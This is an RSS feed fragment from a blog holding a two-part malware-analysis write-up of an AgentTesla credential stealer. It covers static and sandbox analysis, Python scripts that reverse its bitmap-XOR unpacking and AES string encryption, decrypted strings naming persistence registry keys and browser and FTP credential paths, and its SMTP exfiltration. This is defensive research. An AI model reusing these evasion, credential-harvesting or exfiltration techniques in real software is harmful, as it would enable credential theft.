</p><p><a href="/img/MA/sample1/e67.PNG"><a href="/img/MA/sample1/e67.PNG" title="e67" class="gallery-item"><img src="/img/MA/sample1/e67.PNG" alt="e67"></a></a>  </p><p>And After adding some of the Browser Names &amp; Location it checks for them in chunks.<br>Here you can check it does the same process with Yandex Browser.  </p><p><a href="/img/MA/sample1/e68.PNG"><a href="/img/MA/sample1/e68.PNG" title="e68" class="gallery-item"><img src="/img/MA/sample1/e68.PNG" alt="e68"></a></a>  </p><hr><h1 id="Communication-through-SMTP"><a href="#Communication-through-SMTP" class="headerlink" title="Communication through SMTP"></a>Communication through SMTP</h1><p>Now we know some part of how it carries out its stealthy process of stealing credentials from the browswers without any sql query. So I ended up searching for some functions which used the SMTP client responsible for sending the credentials.  </p><p>And I found the only function which used it was <em>tkq.tyx()</em>.<br>Luckily It was not as obfuscated as I thought it to be.  </p><p><a href="/img/MA/sample1/e69.PNG"><a href="/img/MA/sample1/e69.PNG" title="e69" class="gallery-item"><img src="/img/MA/sample1/e69.PNG" alt="e69"></a></a>  </p><p>We can clearly observe our system and browser information which its sending over.<br>Along with them we can also see the plaintext credentials of the author’s email account at yandex.ru which is used to send it.<br>And to no surprise, these credentials were working as we previously checked the any.run results.   </p><a href="https://media.giphy.com/media/OdHeYw7XBk6EE/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/OdHeYw7XBk6EE/giphy.gif" alt="drawing" width="300"/></a>  <p>Also The funny thing is that I had the credentials before this part of the blog as they were just decrypted using the same process I explained.  </p><p><a href="/img/MA/sample1/e70.PNG"><a href="/img/MA/sample1/e70.PNG" title="e70" class="gallery-item"><img src="/img/MA/sample1/e70.PNG" alt="e70"></a></a>  </p><p>We can view our browser credentials in memory dump and the message body is formatted as html.  </p><p><a href="/img/MA/sample1/e71.PNG"><a href="/img/MA/sample1/e71.PNG" title="e71" class="gallery-item"><img src="/img/MA/sample1/e71.PNG" alt="e71"></a></a>  </p><p>It uses different classes such as mailMessage to construct the message body.<br>And Finally It initializes some other variables such as..<br>Port = 587 (default for SMTP)<br>Host = yandex.ru,<br>To and From fields were the same…   </p><p><a href="/img/MA/sample1/e72.PNG"><a href="/img/MA/sample1/e72.PNG" title="e72" class="gallery-item"><img src="/img/MA/sample1/e72.PNG" alt="e72"></a></a>  </p><p>And when it sends over the data it deletes itself from the disk. I didn’t explore it that much and I wasn’t sure maybe it was executed in a thread.  </p><hr><h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p>I hope this 2 part series was insightful and you guys enjoyed it. Well If you are reading this line you really liked it.<br>TBH It really took a lot of work to put it all together including taking screenshots, and not to forget… opening the malware again in dnspy.. everytime it removed itself.  </p><p>See ya guys next time…<br>Till then Take Care and make use of this Lockdown to learn new stuff.<br>Also Keep sharing your findings with the community.</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/MalwareAnalysis/">MalwareAnalysis</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/AgentTesla/">AgentTesla</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/Net/">.Net</category>
      
      
      <comments>https://mrt4ntr4.github.io/How-Analysing-an-AgentTesla-Could-Lead-To-Attackers-Inbox-2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>How Analysing an AgentTesla Could Lead To Attackers Inbox - Part I</title>
      <link>https://mrt4ntr4.github.io/How-Analysing-an-AgentTesla-Could-Lead-To-Attackers-Inbox-1/</link>
      <guid>https://mrt4ntr4.github.io/How-Analysing-an-AgentTesla-Could-Lead-To-Attackers-Inbox-1/</guid>
      <pubDate>Mon, 13 Apr 2020 21:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/MA/sample1/thumb1.png" title="banner" class="gallery-item"><img src="/img/MA/sample1/thumb1.png" alt="banner"></a></p><p>If you’d read my previous articles I assured that I’ll be releasing some article every week but now that seems nearly impossible due to some time constraints. I would have shared some things from my real life and new interesting security related things I come across but I don’t think that will happen too coz I think it will decrease the quality of the blog somehow If i begin to post my random findings which may seem boring to some other readers.  </p><p>What is the thing I love most about Security in general is the research part.. How we can get to real low level to find vulns. And this can happen only if we spend weeks.. maybe months reading and testing it out to give a detailed explanation.<br>Anyways if you have any suggestion/advice regarding this you can always comment and let me know.  </p><hr><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>So as I promised <a href="/EXTORY-Crackme/">previously</a> this one is going to be .NET.<br>PS This is my first post on analysing a live malware sample and I’m not experienced in this field.  </p><p>I know there are other blogposts on AgentTesla online but I didn’t find them as detailed as this one’s going to be.<br>And Yeah I also know the title seems to be a clickbait but its true XD<br>I have divided it into 2 parts and they have around 70+ screenshots as I believe in the fact that <em>Pictures are louder than words</em> :)   </p><blockquote><p>This is a live malware and I don’t want anyone to maliciously use the attacker’s credentials, so obviously I would not give out this sample’s hash and will be redacting a few things as well.  </p></blockquote><p>To start with, I found this sample on <a href="https://bazaar.abuse.ch/">Malware Bazaar</a> and it is tagged as a <strong>COVID19</strong> malware spead through spearphishing.<br>Luckily this sample doesn’t have any anti-debug/vm techniques implemented. Also I’ve not setup my Sniffer VM with inetsim etc. I found it to be fileless. It has a Virustotal Score of 22/71 at time of writing this.  </p><hr><h1 id="Static-Properties-Analysis"><a href="#Static-Properties-Analysis" class="headerlink" title="Static Properties Analysis"></a>Static Properties Analysis</h1><p>I started off with DIE and observed that its .NET based.  </p><p><a href="/img/MA/sample1/die_basic.PNG"><a href="/img/MA/sample1/die_basic.PNG" title="die_basic" class="gallery-item"><img src="/img/MA/sample1/die_basic.PNG" alt="die_basic"></a></a>  </p><p>Also DIE shows that its Packed as its entropy is basically greater than 7.  </p><p><a href="/img/MA/sample1/die_entropy.PNG"><a href="/img/MA/sample1/die_entropy.PNG" title="die_entropy" class="gallery-item"><img src="/img/MA/sample1/die_entropy.PNG" alt="die_entropy"></a></a>  </p><p>Next we can check for some strings in the binary, ANSI doesn’t show anything usually and its same in this case too. Observing the UNICODE strings it looks like this was basically based on a photo manager or something.  </p><p><a href="/img/MA/sample1/die_strings1.PNG"><a href="/img/MA/sample1/die_strings1.PNG" title="die_strings1" class="gallery-item"><img src="/img/MA/sample1/die_strings1.PNG" alt="die_strings1"></a></a>  </p><p>But wait if we scroll down we find something interesting…<br>Yeah It looks similar to base32 encoded string and below it we can see some Game related strings such as <em>frmGameOver</em>, <em>You win!</em>, etc.</p><p><a href="/img/MA/sample1/die_strings2.PNG"><a href="/img/MA/sample1/die_strings2.PNG" title="die_strings2" class="gallery-item"><img src="/img/MA/sample1/die_strings2.PNG" alt="die_strings2"></a></a>  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo JVNJAA | base32 -d</span><br><span class="line">MZ▒base32: invalid input</span><br></pre></td></tr></table></figure><p>Cool It starts with the <strong>MZ</strong> Header and this confirms that its base32 encoded.<br>Unfortunately we can’t copy the whole string here but we can just view it in hexdump by right clicking it in DIE.  </p><p><a href="/img/MA/sample1/die_hex.PNG"><a href="/img/MA/sample1/die_hex.PNG" title="die_hex" class="gallery-item"><img src="/img/MA/sample1/die_hex.PNG" alt="die_hex"></a></a>  </p><hr><h1 id="Behavioral-Analysis"><a href="#Behavioral-Analysis" class="headerlink" title="Behavioral Analysis"></a>Behavioral Analysis</h1><a href="https://media.giphy.com/media/tova1OG4DBgD6/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/tova1OG4DBgD6/giphy.gif" alt="drawing" width="300"/></a>   <p>Now we have the coolest part of running it in a sandbox environment.  </p><p>I used <a href="https://any.run/">any.run</a> and selected a Win7 32 bit VM (Basic plan) and noticed its execution.<br>Hmmm.. So Its silent and doesn’t do any activity on the screen.  </p><p>So, Any.run has this feature of mapping <a href="https://attack.mitre.org/techniques/enterprise/" target="_blank">MITRE Techniques</a> it notices through the malware activity.  </p><p><a href="/img/MA/sample1/anyrun_mitre.PNG"><a href="/img/MA/sample1/anyrun_mitre.PNG" title="anyrun_mitre" class="gallery-item"><img src="/img/MA/sample1/anyrun_mitre.PNG" alt="anyrun_mitre"></a></a>  </p><p>We observe that its basically a credential stealer and tries to communicate with a C&amp;C server.  </p><p><a href="/img/MA/sample1/anyrun_creds.PNG"><a href="/img/MA/sample1/anyrun_creds.PNG" title="anyrun_creds" class="gallery-item"><img src="/img/MA/sample1/anyrun_creds.PNG" alt="anyrun_creds"></a></a>  </p><p>Woah!! It accesses over 72 files and is basically looking for browsers, ftp clients etc. So Any.run has 2 additional browsers I know of ie. Firefox &amp; Opera. And Firefox for instance requires logins.json and key4.db for the passwords which it accesses obviously. <sup><a href="https://support.mozilla.org/en-US/questions/1236145">[1]</a></sup>  </p><p>We can also view the connection requests and looks like its sending data over smtp with <em>smtp.yandex.com</em> and sends some data which includes <em>User-PC</em>.</p><p><a href="/img/MA/sample1/anyrun_smtp.PNG"><a href="/img/MA/sample1/anyrun_smtp.PNG" title="anyrun_smtp" class="gallery-item"><img src="/img/MA/sample1/anyrun_smtp.PNG" alt="anyrun_smtp"></a></a>  </p><p>I also downloaded and analysed the pcap file from any.run but it doesn’t look suspicious as I don’t think the browsers in any.run had some saved passwords.  </p><hr><h1 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h1><p>So to check what it does under the hood we can use dnspy and get on with debugging stuff.<br>I moved over to my setup of Victim VM for which I use Win7 x64.   </p><h3 id="Unpacking-Methods"><a href="#Unpacking-Methods" class="headerlink" title="Unpacking Methods"></a>Unpacking Methods</h3><p>PS I also tried <a href="https://unpac.me/">unpac.me</a> for the first time and I am very much impressed with it. For this sample it resulted in 3 children.  </p><p>Lets see how far can we make it manually.<br>Hmm.. It doesn’t look quite obfuscated right now.  </p><p><a href="/img/MA/sample1/e1.PNG"><a href="/img/MA/sample1/e1.PNG" title="e1" class="gallery-item"><img src="/img/MA/sample1/e1.PNG" alt="e1"></a></a>  </p><p>Also It doesn’t have any constructor, So we just place a breakpoint on its Entrypoint and run it.  </p><p><a href="/img/MA/sample1/e2.PNG"><a href="/img/MA/sample1/e2.PNG" title="e2" class="gallery-item"><img src="/img/MA/sample1/e2.PNG" alt="e2"></a></a>  </p><p>Nice, We end up in <strong>frmMain</strong> and then we can just step in <strong>InitializeComponent</strong>. I noticed that class2 looked suspicious and setup a breakpoint there.  </p><p><a href="/img/MA/sample1/e3.PNG"><a href="/img/MA/sample1/e3.PNG" title="e3" class="gallery-item"><img src="/img/MA/sample1/e3.PNG" alt="e3"></a></a>  </p><p>Ahh actually the base32 encoded payload was used here.  </p><p><a href="/img/MA/sample1/e4.PNG"><a href="/img/MA/sample1/e4.PNG" title="e4" class="gallery-item"><img src="/img/MA/sample1/e4.PNG" alt="e4"></a></a>  </p><p>So this is the first level of unpacking where it simply invokes a function named <em>f20</em>  with arguments as <em>Class1.Myproperty</em> &amp; <em>_2048</em>.  <sup><a href="https://docs.microsoft.com/en-us/dotnet/api/system.type.invokemember?view=netframework-4.8#System_Type_InvokeMember_System_String_System_Reflection_BindingFlags_System_Reflection_Binder_System_Object_System_Object___">[2]</a></sup> </p><p><a href="/img/MA/sample1/e5.PNG"><a href="/img/MA/sample1/e5.PNG" title="e5" class="gallery-item"><img src="/img/MA/sample1/e5.PNG" alt="e5"></a></a><br>Now I place a breakpoint on return in InvokeMember and just continue.  </p><p><a href="/img/MA/sample1/e6.PNG"><a href="/img/MA/sample1/e6.PNG" title="e6" class="gallery-item"><img src="/img/MA/sample1/e6.PNG" alt="e6"></a></a></p><p>Now stepping in we find some interesting locals and the payload file is a dll named <strong>DefenderProtect.dll</strong>.  </p><p><a href="/img/MA/sample1/e7.PNG"><a href="/img/MA/sample1/e7.PNG" title="e7" class="gallery-item"><img src="/img/MA/sample1/e7.PNG" alt="e7"></a></a>  </p><p><a href="/img/MA/sample1/e8.PNG"><a href="/img/MA/sample1/e8.PNG" title="e8" class="gallery-item"><img src="/img/MA/sample1/e8.PNG" alt="e8"></a></a>  </p><p>Also It has another methods as well which are used in <em>f20</em>.  </p><p><a href="/img/MA/sample1/defprotectdll.PNG"><a href="/img/MA/sample1/defprotectdll.PNG" title="defprotect" class="gallery-item"><img src="/img/MA/sample1/defprotectdll.PNG" alt="defprotect"></a></a>  </p><p>So <em>f20</em> is basically used to unpack another file</p><p><a href="/img/MA/sample1/e9.PNG"><a href="/img/MA/sample1/e9.PNG" title="e9" class="gallery-item"><img src="/img/MA/sample1/e9.PNG" alt="e9"></a></a>  </p><p>The <em>array</em> has the final decrypted 2nd payload file so we can dump it using Memory Window too.  </p><p><a href="/img/MA/sample1/e10.PNG"><a href="/img/MA/sample1/e10.PNG" title="e10" class="gallery-item"><img src="/img/MA/sample1/e10.PNG" alt="e10"></a></a>  </p><p>But whats the fun in doing that, instead we can try to understand the unpacking algo. Hmm.. the resource from <em>_2048</em> named <em>ABHqTRJFnsWBEzLtXeCZ</em> is used in this process.    </p><p><a href="/img/MA/sample1/e11.PNG"><a href="/img/MA/sample1/e11.PNG" title="e11" class="gallery-item"><img src="/img/MA/sample1/e11.PNG" alt="e11"></a></a>  </p><p>fcn. <em>detroit1</em> just returns that resource as a handle to a bitmap image.  </p><p><a href="/img/MA/sample1/e12.PNG"><a href="/img/MA/sample1/e12.PNG" title="e12" class="gallery-item"><img src="/img/MA/sample1/e12.PNG" alt="e12"></a></a>  </p><p>The main algo resides in fcn <em>detroit1</em> and <em>detroit</em><br><em>detroit1</em> adds a pixel’s rgb value to a list when it is non-black.   </p><p><a href="/img/MA/sample1/e13.PNG"><a href="/img/MA/sample1/e13.PNG" title="e13" class="gallery-item"><img src="/img/MA/sample1/e13.PNG" alt="e13"></a></a>  </p><p>Then <em>detroit</em> does a repeating key xor on the list returned by <em>detroit0</em><br>where the key is first 16 bytes of the list.  </p><p><a href="/img/MA/sample1/det.PNG"><a href="/img/MA/sample1/det.PNG" title="det" class="gallery-item"><img src="/img/MA/sample1/det.PNG" alt="det"></a></a>  </p><p>So I just saved the bitmap image and wrote a python script to test the algo as well.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> hexdump <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;ABHqTRJFnsWBEzLtXeCZ&quot;</span>)</span><br><span class="line"></span><br><span class="line">pixels = img.load()</span><br><span class="line">pixList = []</span><br><span class="line">width, height = img.size</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        cpixel = pixels[x, y]</span><br><span class="line">        <span class="keyword">if</span>(cpixel != (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)):</span><br><span class="line">            <span class="keyword">for</span> value <span class="keyword">in</span> cpixel[:<span class="number">3</span>]:</span><br><span class="line">        pixList.append(value)</span><br><span class="line"></span><br><span class="line">xorkey = pixList[:<span class="number">16</span>]</span><br><span class="line">encPayload = pixList[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="built_in">len</span>(encPayload)):</span><br><span class="line">    encPayload[i] ^= xorkey[i%<span class="number">16</span>]</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">dec = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(d) <span class="keyword">for</span> d <span class="keyword">in</span> encPayload[:<span class="number">9200</span>]])</span><br><span class="line"><span class="built_in">print</span> hexdump(dec)</span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">open</span>(<span class="string">&#x27;dontopen.gg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> lol <span class="keyword">in</span> dec:</span><br><span class="line">    payload.write(<span class="built_in">chr</span>(lol))</span><br></pre></td></tr></table></figure><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000: 4D 5A 90 00 03 00 00 00  04 00 00 00 FF FF 00 00  MZ..............</span><br><span class="line">00000010: B8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  ........@.......</span><br><span class="line">00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000030: 00 00 00 00 00 00 00 00  00 00 00 00 80 00 00 00  ................</span><br><span class="line">00000040: 0E 1F BA 0E 00 B4 09 CD  21 B8 01 4C CD 21 54 68  ........!..L.!Th</span><br><span class="line">00000050: 69 73 20 70 72 6F 67 72  61 6D 20 63 61 6E 6E 6F  is program canno</span><br><span class="line">00000060: 74 20 62 65 20 72 75 6E  20 69 6E 20 44 4F 53 20  t be run in DOS </span><br><span class="line">00000070: 6D 6F 64 65 2E 0D 0D 0A  24 00 00 00 00 00 00 00  mode....$.......</span><br><span class="line">00000080: 50 45 00 00 4C 01 03 00  0D C8 84 5E 00 00 00 00  PE..L......^....</span><br></pre></td></tr></table></figure><p>Now this boy looks obfuscated.</p><p><a href="/img/MA/sample1/e14.PNG"><a href="/img/MA/sample1/e14.PNG" title="e14" class="gallery-item"><img src="/img/MA/sample1/e14.PNG" alt="e14"></a></a>  </p><p>But it just starts a thread and I was unable to debug it.<br>Also that isn’t a big deal as this was mainly invoking a method from another file it just unpacked.. <strong>¯\_(ツ)_/¯</strong>  </p><p><a href="/img/MA/sample1/e15.PNG"><a href="/img/MA/sample1/e15.PNG" title="e15" class="gallery-item"><img src="/img/MA/sample1/e15.PNG" alt="e15"></a></a>  </p><p>Now finally we will be analysing the last and third file which resulted in unpacme.  </p><p><a href="/img/MA/sample1/3rd.PNG"><a href="/img/MA/sample1/3rd.PNG" title="3rd" class="gallery-item"><img src="/img/MA/sample1/3rd.PNG" alt="3rd"></a></a>  </p><p>We step in and are currently in <em>zdb</em> method.  </p><p><a href="/img/MA/sample1/e16.PNG"><a href="/img/MA/sample1/e16.PNG" title="e16" class="gallery-item"><img src="/img/MA/sample1/e16.PNG" alt="e16"></a></a>  </p><p>Now when I stepped in the above line to get value for text I observed that a function is called repeatedly. Hmm.. Maybe It is used for some deobfuscation or decryption of suspicious.  </p><p><a href="/img/MA/sample1/e17.PNG"><a href="/img/MA/sample1/e17.PNG" title="e17" class="gallery-item"><img src="/img/MA/sample1/e17.PNG" alt="e17"></a></a><br><a href="/img/MA/sample1/e26.PNG"><a href="/img/MA/sample1/e26.PNG" title="e26" class="gallery-item"><img src="/img/MA/sample1/e26.PNG" alt="e26"></a></a>  </p><hr><h2 id="Decrypting-Strings"><a href="#Decrypting-Strings" class="headerlink" title="Decrypting Strings"></a>Decrypting Strings</h2><p>We step into that suspicious function obfuscated as <em>\u206E</em> and at first It looks like assigning a list of objects from <em>\uFEFF</em></p><p><a href="/img/MA/sample1/e18.PNG"><a href="/img/MA/sample1/e18.PNG" title="e18" class="gallery-item"><img src="/img/MA/sample1/e18.PNG" alt="e18"></a></a>  </p><p>The object array looks like the following in the locals window and contains integer arrays.  </p><p><a href="/img/MA/sample1/e19.PNG"><a href="/img/MA/sample1/e19.PNG" title="e19" class="gallery-item"><img src="/img/MA/sample1/e19.PNG" alt="e19"></a></a>  </p><p>So we setup a normal breakpoint at the function return. It passes the beginning 32 bytes of the string as key and the next 16 bytes as the IV to the Decryption function.     </p><p><a href="/img/MA/sample1/e20.PNG"><a href="/img/MA/sample1/e20.PNG" title="e20" class="gallery-item"><img src="/img/MA/sample1/e20.PNG" alt="e20"></a></a>  </p><p>And Now execution is passed over to Rijndael(AES) decryption function and we can clearly see that it isn’t obfuscated and has variable names as key &amp; IV, and looks like CBC mode ezpz :)</p><p><a href="/img/MA/sample1/e21.PNG"><a href="/img/MA/sample1/e21.PNG" title="e21" class="gallery-item"><img src="/img/MA/sample1/e21.PNG" alt="e21"></a></a>  </p><p>We can just place a Breakpoint at <em>return text</em>  in <em>CreateStringFromEncoding</em> and we will get the decoded string in the locals window and we’d get to know whenever this decryption func is invoked as well.    </p><p><a href="/img/MA/sample1/e22.PNG"><a href="/img/MA/sample1/e22.PNG" title="e22" class="gallery-item"><img src="/img/MA/sample1/e22.PNG" alt="e22"></a></a>  </p><p>So this time it returns “None” due to exception but sometimes the same gives “WinMgmt:”. Also we can now rename it to <strong>decStr()</strong> for our ease.  </p><p><a href="/img/MA/sample1/e23.PNG"><a href="/img/MA/sample1/e23.PNG" title="e23" class="gallery-item"><img src="/img/MA/sample1/e23.PNG" alt="e23"></a></a>  </p><p>Moving on.. It access/creates some environment variables.  </p><p><a href="/img/MA/sample1/e24.PNG"><a href="/img/MA/sample1/e24.PNG" title="e24" class="gallery-item"><img src="/img/MA/sample1/e24.PNG" alt="e24"></a></a>  </p><p><a href="/img/MA/sample1/e25.PNG"><a href="/img/MA/sample1/e25.PNG" title="e25" class="gallery-item"><img src="/img/MA/sample1/e25.PNG" alt="e25"></a></a>  </p><p>Now I thought of decrypting all of the strings with python.  </p><p>Unfortunately I was not able to copy the content of the encrypted int array from the locals and copying it from the declaration was not efficient.<br>The problem with dumping a array local from the memory window (in this case) in dnspy is it just shows it in reverse (maybe coz of little endian).<br>But the array starts below what it refers to there and I was somehow able to select it manually and dumped it finally.  </p><p>Then I tried to implement the algo in python and coz of my weird workaround for dumping it, the script resulted in some errors. But I noticed that the error arised due to the values in list strEnds(below) and they were pretty common at the string end and I used them to split the dump and get a single string.  I think this was because of the uint[] initialization in the object array.<br>Anyways It finally worked and there were around 865 enc strings.  </p><a href="https://media.giphy.com/media/FA77mwaxV74SA/giphy-downsized.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/FA77mwaxV74SA/giphy-downsized.gif" alt="drawing" width="300"/></a>   <p>PS The Key and IV for every cipher is different and is taken from the encoded string as well.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decipher</span>(<span class="params">dd</span>):</span></span><br><span class="line">    key = dd[<span class="number">0</span>:<span class="number">0x20</span>]</span><br><span class="line">    iv = dd[<span class="number">0x20</span>:<span class="number">0x30</span>]</span><br><span class="line">    cipher = dd[<span class="number">0x30</span>:]</span><br><span class="line">    rijn = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decipher = rijn.decrypt(cipher).strip()</span><br><span class="line">    plain = <span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x <span class="keyword">in</span> string.printable, decipher)</span><br><span class="line">    <span class="built_in">print</span> plain</span><br><span class="line"></span><br><span class="line">dmp = <span class="built_in">open</span>(<span class="string">&#x27;dump.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">strEnds = [<span class="string">&quot;0000000048191F0110000000&quot;</span>,</span><br><span class="line"><span class="string">&quot;0000000048191F0114000000&quot;</span>,</span><br><span class="line"><span class="string">&quot;0000000048191F0118000000&quot;</span>,</span><br><span class="line"><span class="string">&quot;0000000048191F011C000000&quot;</span>,</span><br><span class="line"><span class="string">&quot;0000000048191F0124000000&quot;</span>,</span><br><span class="line"><span class="string">&quot;0000000048191F0120000000&quot;</span>,</span><br><span class="line"><span class="string">&quot;0000000048191F012C000000&quot;</span>,</span><br><span class="line"><span class="string">&quot;0000000048191F0128000000&quot;</span>,</span><br><span class="line"><span class="string">&quot;000000004819C4001C000000&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> end <span class="keyword">in</span> strEnds:</span><br><span class="line">    dmp = dmp.replace(end, <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">lol = dmp.split()</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> lol:</span><br><span class="line">    <span class="built_in">print</span> c,</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decipher(x.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[!] ERROR :&quot;</span>, x , <span class="string">&quot;Length :&quot;</span>, <span class="built_in">len</span>(x.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    c+=<span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>Full Results : <a href="/files/MA/sample1/dec.txt">dec.txt</a></p></blockquote><p>Some of the decrypted strings are as follows :</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WScript.Shell</span><br><span class="line">Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run</span><br><span class="line">SELECT * FROM Win32_Processor</span><br><span class="line">Opera Software\Opera Stable</span><br><span class="line">Yandex\YandexBrowser\User Data</span><br><span class="line">Chrome\Chrome\User Data</span><br><span class="line">\FTP Navigator\Ftplist.txt</span><br><span class="line">HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites</span><br></pre></td></tr></table></figure><p>Hmm so it also uses <a href="https://ss64.com/vb/shell.html">WScript.Shell</a>, maybe for executing some system commands.<br>Also it uses some registry keys for persistence and adding itself to the startup.<br>And Gets some info about our system using <a href="https://devblogs.microsoft.com/scripting/use-powershell-and-wmi-to-get-processor-information/">Win32_Processor</a><br>Access locations associated with browsers mainly “User Data” and looks for some FTP credentails too.  </p><blockquote><p>So Now I guess Its enough for Part-1, Head over <a href="/How-Analysing-an-AgentTesla-Could-Lead-To-Attackers-Inbox-2/">here</a> for the 2nd Part.  </p></blockquote></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/MalwareAnalysis/">MalwareAnalysis</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/AgentTesla/">AgentTesla</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/Net/">.Net</category>
      
      
      <comments>https://mrt4ntr4.github.io/How-Analysing-an-AgentTesla-Could-Lead-To-Attackers-Inbox-1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>EXTORY&#39;s Crackme</title>
      <link>https://mrt4ntr4.github.io/EXTORY-Crackme/</link>
      <guid>https://mrt4ntr4.github.io/EXTORY-Crackme/</guid>
      <pubDate>Tue, 18 Feb 2020 07:00:00 GMT</pubDate>
      
        
        
